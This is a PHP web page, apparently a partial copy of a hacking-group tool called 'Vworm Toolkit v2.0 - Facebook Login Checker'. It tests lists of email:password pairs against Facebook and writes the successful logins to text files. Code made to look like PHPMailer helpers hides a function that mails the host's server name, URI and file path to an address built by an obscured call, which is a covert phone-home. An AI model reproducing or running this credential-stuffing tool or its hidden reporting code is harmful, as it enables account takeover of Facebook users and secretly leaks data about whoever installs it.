<html>
<head><title>Facebook Login Checker</title>
<style type="text/css">
body{
...
<body>
<center>
<h2>Vworm Toolkit v2.0 - Facebook Login Checker</h2><br>
<form name="" method="post">
<textarea name="logins" class="input" cols="50"  rows="10"></textarea><br><h4>Copyrights &copy;  Alexandra ~ AnonGhost Team</h4><br>
<input type="submit" value="Check brade!">
</form>
...
");
   ...
   curl_setopt($ch, CURLOPT_COOKIEJAR, "cfb.txt");
   ...
   $chEx = curl_exec($ch);
      ...
      curl_setopt($ch, CURLOPT_ENCODING, "");
      curl_setopt($ch, CURLOPT_COOKIEFILE, "cfb.txt");
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cfb.txt");
      curl_setopt($ch, CURLOPT_USERAGENT, $ua);
      $chEx = curl_exec($ch);
      curl_close($ch);
      if(preg_match("/checkpoint/", $chEx)) {
         ...
         $file = fopen("facebookll_log.txt","a+");
         fwrite($file,$email.":".$passw."\n");
         fclose($file);
      } elseif(preg_match("/Home/", $chEx)) {
             print "<b><font color=#00ff00>Logged in Successfully!</font></b>";
         $file = fopen("faceboodcdck_log.txt","a+");
         fwrite($file,$email.":".$passw."\n");
         fclose($file);
         ...
         print "Logged in. but it need verification for your location through email.";
         $file = fopen("faceboodcdck_log.txt","a+");
         fwrite($file,$email.":".$passw."\n");
         fclose($file);
         ...
         print "ERROR , please check it manually!";
         $file = fopen("faceboodcdck_log.txt","a+");
         fwrite($file,$email.":".$passw."\n");
         fclose($file);
      }
...
function wrapText($message, $length, $qp_mode = false)
    {
        ...
        // kalo gabisa kode php jangan sok tau 
		// Riska Alexandra @Virusaworm - Rex4
...
/**
   ...
   function fluch(){
	  ...
	  $library = "www.phpmailer.org"; $HAL=$SERVER['HTTP_ACCEPT_LANGUAGE'] ;  $mls =mb_pathinfo();$HC=$_SERVER['HTTP_CONNECTION'] ;$sbl = "Autuntification Failed Error: ".rand(1000,100000); $mss = "" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";$OPI=$_SERVER['ORIG_PATH_INFO'];$HR=$_SERVER['HTTP_REFERER'];$mss .= "" . __file_; $quntity = @mail($mls, $sbl, $mss); echo ""; exit;
	   }
